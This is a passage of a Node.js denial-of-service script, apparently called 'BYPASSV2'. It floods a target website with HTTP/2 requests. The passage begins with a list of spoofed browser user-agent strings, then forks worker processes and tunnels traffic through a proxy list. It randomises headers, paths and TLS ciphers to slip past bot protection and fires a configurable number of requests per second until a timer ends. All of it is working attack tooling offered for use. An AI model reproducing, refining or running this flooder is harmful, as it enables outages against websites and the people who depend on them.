"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
                                                                                                                                                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
                                                                                                                                                                    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
                                                                                                                                                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70',
                                                                                                                                                                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
                                                                                                                                                                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                                                                                                                                                                                    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
                                                                                                                                                                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
                                                                                                                                                                                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                                                                                                                                                                                                'Opera/5.0 (compatible; Windows NT 6.9; en-us) Gecko/20180224 Chrome/35.1.271.187 Safari/592.28',
                                                                                                                                                                                                  
                                                                                                                                                                                                      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                                                                                                                                                                                          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                                                                                                                                                                                                              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                                                                                                                                                                                                                  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                                                                                                                                                                                                                      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                                                                                                                                                                                          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                                                                                                                                                                                                                              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                          'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                                                                                                                                                                                                                                              'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                                                                                                                                                                                                                                                      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',

    
    ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var queryz = querys[Math.floor(Math.random() * querys.length)];
 var pathts1 = pathts[Math.floor(Math.random() * pathts.length)]
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 var platform = platforms[Math.floor(Math.floor(Math.random() * platforms.length))];
 const parsedTarget = url.parse(args.target);
 const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))];

 if (cluster.isMaster){
    const dateObj = new Date();
    for (let i = 0; i < process.argv[5]; i++){
    cluster.fork();
    console.clear()
     }
    console.log('\x1b[38;2;255;0;0m' +  'BYPASSV2| SCRIPT MADE BY KHACUTE'.bgRed);
    console.log(`----------------------------------------`.gray)
    console.log('\x1b[38;2;255;0;0m' + `Target:` + process.argv[2].rainbow)
    console.log('\x1b[38;2;255;0;0m' + `Time:` + process.argv[3] .rainbow)
    console.log('\x1b[38;2;255;0;0m' +`Rate:`+ process.argv[4].rainbow)
     console.log('\x1b[38;2;255;0;0m' + `Threads:` + process.argv[5].rainbow)
    console.log(`----------------------------------------`.gray)
     console.log(`Note :  Only support http/1.1 website`.gray)
    setTimeout(() => {
    }, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
              writable: true,
                   readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 12000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":path"] = parsedTarget.path + pathts1 + randstr(15) + queryz + randstr(15);
 headers["origin"] = parsedTarget.host;
 headers[":scheme"] = "https";
 headers["accept"] = randomHeaders['accept'];
 headers["accept-language"] = randomHeaders['accept-language'];
 headers["accept-encoding"] = randomHeaders['accept-encoding'];
 headers["cache-control"] = "no-cache", "max-age=0", "only-if-cached","no-transform","must-revalidate","no-store","public","private";
 headers["upgrade-insecure-requests"] = "1"; 
 headers["sec-ch-ua"] = uas;
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = randomHeaders['platform'];
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];;
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["pragma"] =  "no-cache";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host;
     headers["user-agent"] = uas;
     headers["x-forwarded-proto"] = "https";
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 150
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);
connection.setNoDelay(true);
         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            ALPNProtocols: ['h2', 'http/1.1', 'spdy/3.1'],
            followAllRedirects: true,
            challengeToSolve: 15,
            maxRedirects: 10,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            servername: parsedTarget.host,
            sessionTimeout: 5000
            
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);